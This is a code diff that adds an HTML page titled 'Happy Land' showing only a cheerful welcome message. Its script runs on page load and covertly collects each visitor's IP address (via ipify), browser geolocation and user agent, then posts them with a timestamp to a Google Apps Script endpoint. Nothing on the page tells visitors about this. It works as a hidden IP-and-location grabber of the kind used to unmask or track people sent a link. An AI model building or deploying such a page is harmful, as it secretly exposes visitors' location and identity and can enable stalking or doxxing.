@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy Land</title>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            // Collect user agent
+            const userAgent = navigator.userAgent;
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbxB3XbbGp0vA80wJFaw_ixUEsgkDbc8vHFWvfuptktfWDh8VcxBGtLdVt0iaP5CNERUXg/exec';
+
+            // Function to fetch IP address
+            function getIPAddress() {
+                return fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => data.ip)
+                    .catch(error => 'Error fetching IP');
+            }
+
+            // Function to fetch geolocation
+            function getGeolocation() {
+                return new Promise((resolve) => {
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            position => resolve({
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude
+                            }),
+                            () => resolve({
+                                latitude: 'Geolocation not supported',
+                                longitude: 'Geolocation not supported'
+                            })
+                        );
+                    } else {
+                        resolve({
+                            latitude: 'Geolocation not supported',
+                            longitude: 'Geolocation not supported'
+                        });
+                    }
+                });
+            }
+
+            // Function to send data to Google Sheets
+            function sendData(ip, lat, lon, ua) {
+                const data = {
+                    'IP Address': ip,
+                    'User Agent': ua,
+                    'Latitude': lat,
+                    'Longitude': lon,
+                    'Date': new Date().toISOString()
+                };
+
+                fetch(scriptURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: new URLSearchParams(data)
+                });
+            }
+
+            // Collect and send data
+            getIPAddress().then(ip => {
+                getGeolocation().then(location => {
+                    sendData(ip, location.latitude, location.longitude, userAgent);
+                });
+            });
+        });
+    </script>
+</head>
+<body>
+    <h1>Welcome to Happy Land</h1>
+    <p>Your visit is being happy!</p>
+</body>
+</html>
